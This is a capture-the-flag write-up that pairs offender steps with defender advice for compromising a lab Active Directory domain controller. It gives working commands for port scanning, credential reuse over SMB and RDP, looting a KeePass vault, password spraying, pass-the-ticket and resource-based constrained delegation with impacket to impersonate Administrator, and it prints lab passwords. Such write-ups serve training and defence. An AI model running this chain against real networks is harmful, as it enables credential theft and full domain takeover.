Forward Challenge – Offender vs Defender Perspective
Initial Access
==============
We already had initial access to the internal network. The next step was to identify which ports and services were open so that credentials could be used effectively. Blindly attempting logins wastes time and effort; proper network reconnaissance ensures we understand which targets are available to exploit or access. This allows us to direct our efforts in the right direction.

Defender perspective:  
Security teams should actively monitor for port‑scanning and reconnaissance activity, as these are often the first indicators of an intrusion. Implement strict network segmentation and limit exposed services to reduce the attack surface. Early detection of scanning attempts can significantly hinder adversary progress.

**Network Recon**
=================
```
nmap -sS -p- 10.130.187.188
```
<img width="557" height="351" alt="forward_0_nmap_port" src="https://github.com/user-attachments/assets/63d5e2e6-23b8-4e84-8aca-e77c53b20026" />

Here we got some important ports:
88 Kerberos
135,139 RPC
389 LDAP
445 SMB
636 LDAPSSL
3389 RDP

Defender perspective:  
These ports represent critical attack surfaces. Limit exposure of Kerberos, LDAP, and RDP to trusted hosts only. Monitor for unusual traffic on SMB and RPC, as these are common lateral movement paths.

**Service Fingerprint**
=====================
```
nmap -sS -sC -sV -p 88,135,139,389,445,636,3389 10.130.187.188
```

<img width="549" height="341" alt="forward_0_nmap_service_enum1" src="https://github.com/user-attachments/assets/d7d82d69-bd88-47eb-ab0c-d44b7f99cb22" />

From the service fingerprint, we obtained details about the target domain name and confirmed the system was a Domain Controller.

Domain Controllers should not expose RDP to standard users. Access should be limited to privileged administrative accounts, and all RDP sessions should be logged and monitored. Service fingerprinting attempts should trigger alerts, as they indicate adversaries are mapping the environment for exploitation.

<img width="550" height="179" alt="forward_0_nmap_service_enum2" src="https://github.com/user-attachments/assets/8cf63b88-a61b-49d3-a06c-8ef1839650c9" />

**SMB Signing**
==================
SMB signing was enabled and enforced, preventing attackers from exploiting:
NTLM Relay Attacks (Man‑in‑the‑Middle)
LLMNR/NBNS Poisoning
SMB Session Hijacking
Man‑in‑the‑Middle Data Manipulation

The enforcement of SMB signing is a strong defensive measure. Organizations should ensure this configuration is consistently applied across all systems. Regular audits of SMB settings help maintain integrity protections and prevent credential relay or traffic tampering.

Initial Access (Abusing Administrative Protocols)
===============
```
nxc smb 10.130.187.188 -u "ctf.local\j.smith" -p "JSmith@IT2024"
```

<img width="557" height="131" alt="forward_0_nxc_check" src="https://github.com/user-attachments/assets/d4d79455-b03d-4c61-8da9-5eb7f185801b" />

We logged into the target using credentials and confirmed that the j.smith account did not have administrator rights. Since no other login service was available, we used RDP.
xfreerdp /v:10.130.187.188 /u:"ctf.local\j.smith" /p:"JSmith@IT2024"

Restrict RDP access to non‑administrative accounts and enforce multi‑factor authentication for all remote logins. Monitor authentication attempts across SMB and RDP to detect misuse of valid but low‑privilege credentials.

Host/Domain Enumeration
=======================
``` net user ```
<img width="485" height="255" alt="forward_1_dc_users" src="https://github.com/user-attachments/assets/b17bf299-7813-4ea0-8356-c54f78491abd" />
```
net user /domain
net user j.smith
```
<img width="440" height="310" alt="forward_1_dc_user_jsmith" src="https://github.com/user-attachments/assets/d4ab2dd2-c440-4bca-a049-e979f433503c" />

As the target was a Domain Controller, local accounts were effectively domain accounts because the local SAM database is replaced with the ntds.dit database. The results were identical, and the domain name (e.g., ctf.local) was not required as a prefix. Group details confirmed why we were able to log in via RDP.

Commands such as net user and net group should be monitored, as they are commonly used for enumeration. Group memberships must be regularly audited to ensure only authorized accounts have RDP privileges.

**Directory Enumeration**
=========================

<img width="323" height="137" alt="forward_1_dc_user_jsmith_database" src="https://github.com/user-attachments/assets/24ae90be-2a55-4b0b-96c6-3f710aec029b" />

Directory enumeration was an important step. We ensured to enumerate the logged‑in user first. We found Database.kdbx, a KeePass password manager file. Because it was located in the same user’s directory, we could access it easily.

<img width="485" height="327" alt="forward_1_dc_user_jsmith_database_creds" src="https://github.com/user-attachments/assets/a902122e-c0ad-403e-b919-01c5026ba4a0" />

We opened the file with KeePass, successfully logged in, and retrieved additional credentials:
t.jones:redacted
```
runas /user:t.jones cmd.exe
```
We then checked these credentials against existing domain users. Logging in as t.jones revealed no special privileges; it was just a standard domain account.

Sensitive files like KeePass databases should not be stored in user directories. Monitor for access to password vault files.

**Elevate Privilege – Password Spraying**
=====================================
Password spraying revealed valid credentials for r.williams.
```
nxc smb 10.130.187.188 -u users.txt -p "redacted" --continue-on-success
nxc rdp 10.130.187.188 -u users.txt -p "redacted" --continue-on-success
```
<img width="947" height="245" alt="forward_3_dc_user_rwilliams_creds" src="https://github.com/user-attachments/assets/8f3e6676-8115-4d92-8b66-3c65539239e6" />
```
net user r.williams
net localgroup sysadmin
```
<img width="362" height="303" alt="forward_3_dc_user_rwilliams" src="https://github.com/user-attachments/assets/4751a9c6-1f2a-4b04-899d-06e60aba9225" />

On the desktop, there was an automation notice in the r.williams folder.

<img width="393" height="264" alt="forward_3_dc_user_rwilliams_auto_notice" src="https://github.com/user-attachments/assets/4b629311-f8cf-458b-affd-27ce3e300ae8" />

Implement account lockout policies and MFA to prevent password spraying. Audit privileged accounts like sysadmin. Monitor for suspicious automation files or scheduled tasks.

**Kerberos Ticket Attempt (Informational)**
===========================================
```
base64 -d Helpdesk-Auth.b64 > ticket.kirbi
ticketConverter.py share/ticket.kirbi cool.ccache
export KRB5CCNAME=cool.ccache
psexec.py ctf.local\svc.scanner@10.130.187.188 -k -no-pass -dc-ip 10.130.187.188
```
<img width="551" height="366" alt="forward_4_dc_ticket_expire" src="https://github.com/user-attachments/assets/d0aa6268-558a-4b29-8ba7-c6e5eb448755" />

We attempted to use a base64‑encoded Kerberos ticket for pass‑the‑ticket, but the ticket had already expired.

Short ticket lifetimes reduce replay risk. Monitor for unusual Kerberos ticket conversions and environment variable changes. Service accounts must be closely monitored, with credentials rotated regularly.

**BloodHound Analysis**
======================== 
We captured domain data using BloodHound and visualized the graph for granular control. Using r.williams as the center point, we navigated through different nodes. We discovered an Outbound Object Control where r.williams had AddAllowedToAct privileges over the Domain Controller.

<img width="903" height="371" alt="forward_5_dc_rwilliams_allowdtoact" src="https://github.com/user-attachments/assets/e349d201-c905-468f-8ea7-964fa0050ece" />

Delegation rights should be audited frequently to identify and remove unnecessary privileges. Monitoring for suspicious computer account creation or modifications to delegation settings can help detect adversary activity.

**Resource‑Based Constrained Delegation**
=======================================
```
addcomputer.py 'ctf.local/r.williams:redacted' -dc-host dc01.ctf.local -dc-ip 10.130.187.188
rbcd.py -delegate-from 'DESKTOP-MXG694WM$' -delegate-to 'DC01$' -action write 'ctf.local/r.williams:redacted!' -dc-host DC01.ctf.local -dc-ip 10.130.187.188
getST.py -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' 'ctf.local/DESKTOP-MXG694WM$:D27KJpsURErSaQuKa5D4sPerWVxdtrlS' -dc-ip 10.130.187.188
psexec.py ctf.local/Administrator@dc01.ctf.local -no-pass -k
```

We used RBCD to impersonate the Administrator and gained full access to the Domain Controller.

Constrained delegation settings must be carefully reviewed and restricted to only essential accounts. Privilege escalation attempts involving delegation should be closely monitored. Applying least‑privilege principles and auditing delegation configurations can prevent adversaries from exploiting these mechanisms.

